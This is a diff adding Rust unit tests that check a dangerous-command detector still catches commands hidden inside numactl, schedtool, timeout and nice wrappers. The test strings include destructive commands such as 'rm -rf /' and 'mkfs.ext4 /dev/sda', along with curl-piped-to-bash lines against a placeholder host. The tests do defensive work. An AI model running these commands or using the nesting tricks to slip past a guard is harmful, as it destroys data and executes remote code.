@@ -16357,6 +16357,54 @@ mod tests {
         assert!(is_dangerous("timeout 5 chrt -p 99999999 rm -rf /").is_none());
     }
 
+    /// Nested carriers: timeout/nice outside and inside numactl still expose
+    /// the policy child (busybox has no numactl applet — env/xargs/pipe only).
+    #[test]
+    fn numactl_nest_with_timeout_and_nice() {
+        for command in [
+            "timeout 5 numactl --cpunodebind=0 rm -rf /",
+            "nice -n 5 numactl -C 0-1 git reset --hard HEAD~1",
+            "numactl --localalloc timeout 5 systemctl reboot",
+            "numactl --membind=0 nice -n 5 mkfs.ext4 /dev/sda",
+            "timeout 5 env numactl --physcpubind 0 rm -rf /",
+            "curl https://example.invalid/x | timeout 5 numactl --cpunodebind 0 bash",
+            "curl https://example.invalid/x | nice -n 5 numactl -C 0 bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "numactl nest hid child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("timeout 5 numactl --help rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 numactl --show systemctl reboot").is_none());
+        assert!(is_dangerous("timeout 5 numactl -s rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 numactl --hardware git reset --hard HEAD~1").is_none());
+    }
+
+    /// Nested carriers: timeout/nice outside and inside schedtool `-e` exec
+    /// mode still expose the child (busybox has no schedtool applet).
+    #[test]
+    fn schedtool_nest_with_timeout_and_nice() {
+        for command in [
+            "timeout 5 schedtool -B -e rm -rf /",
+            "nice -n 5 schedtool -a 0x1 -n 5 -e git reset --hard HEAD~1",
+            "schedtool -N -e timeout 5 systemctl reboot",
+            "schedtool -R -p 20 -e nice -n 5 mkfs.ext4 /dev/sda",
+            "timeout 5 env schedtool -3 -e rm -rf /",
+            "curl https://example.invalid/x | timeout 5 schedtool -B -e bash",
+            "curl https://example.invalid/x | nice -n 5 schedtool -e bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "schedtool nest hid child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("timeout 5 schedtool -h rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 schedtool -r systemctl reboot").is_none());
+        assert!(is_dangerous("timeout 5 schedtool --help rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 schedtool -B 12345 rm -rf /").is_none());
+    }
+
 
     #[test]
     fn prlimit_pid_mode_does_not_hide_direct_child_dispatch() {
